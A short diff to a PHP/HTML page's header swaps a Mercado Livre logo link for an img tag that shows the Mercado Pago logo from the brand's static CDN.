@@ -118,7 +118,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 <body>
 
     <header class="main-header">
-        <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
+        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.72/mercadopago/logo__small.png" alt="Mercado Pago">
     </header>
 
     <main class="main-content">
